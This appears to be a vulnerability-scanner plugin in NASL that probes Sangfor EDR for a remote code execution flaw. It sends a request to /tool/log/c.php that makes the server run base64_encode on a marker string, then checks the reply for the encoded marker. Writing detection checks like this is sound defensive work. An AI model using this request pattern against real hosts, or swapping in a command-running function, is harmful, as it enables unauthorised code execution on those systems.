############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799282);
  script_version("1.3");
  script_name(english:"sangfor_edr_rce_vuln");
  script_summary(english:"sangfor_edr_rce_vuln");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"sangfor_edr_rce_vuln");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl","sangfor_edr_detect.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_keys("www/Sangfor_Edr");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
		url = "/tool/log/c.php?strip_slashes=base64_encode&host=TEST_For_Sangfor_EDR_RCE";
		req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
		if("200 O">< req[0] && "VEVTVF9Gb3JfU2FuZ2Zvcl9FRFJfUkNF" >< req[2]){
		if (report_verbosity > 0) security_hole(port:port, extra:req[2]);
			else security_hole(port);
			}
}

function check_vuln_ssl(port){
        res = http_get(item:"/tool/log/c.php?strip_slashes=base64_encode&host=TEST_For_Sangfor_EDR_RCE",port:port);
		ssl_req = https_req_get(port:port , request:res);
		if("200 O"><ssl_req && "VEVTVF9Gb3JfU2FuZ2Zvcl9FRFJfUkNF" >< ssl_req){
			if (report_verbosity > 0) security_hole(port:port, extra:ssl_req);
			else security_hole(port);
			}
}
##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
